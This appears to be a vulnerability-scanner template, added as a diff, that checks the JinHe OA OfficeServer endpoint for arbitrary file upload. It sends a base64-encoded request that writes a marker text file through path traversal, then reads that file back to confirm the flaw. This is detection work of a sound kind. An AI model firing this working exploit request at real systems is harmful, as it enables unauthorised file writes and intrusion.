@@ -1,0 +1,24 @@
+id: JinHeOA-OfficeServer-FileUpload
+info:
+  name: 金和oa OfficeServer任意文件上传
+  author: e-Mobile_Upload
+  severity: high
+
+requests:
+  - raw:
+      - |
+        POST /jc6/OfficeServer HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {{base64_decode("REJTVEVQIFYzLjAgICAgIDg5ICAgICAgICAgICAgICAgICAgICAgMCAgICAgICAgMTA0ICAgICAgICAgICAgIERCU1RFUD1SRUpUVkVWUQpPUFRJT049VTBGV1JVRlRTRlJOVEE9PQpIVE1MTkFNRT1MaTR2TGk0dmNIVmliR2xqTDJWa2FYUXZabkYzTkM1MGVIUT0KMTIzMjE=")}}
+      - |
+        GET /public/edit/fqw4.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "12321")'
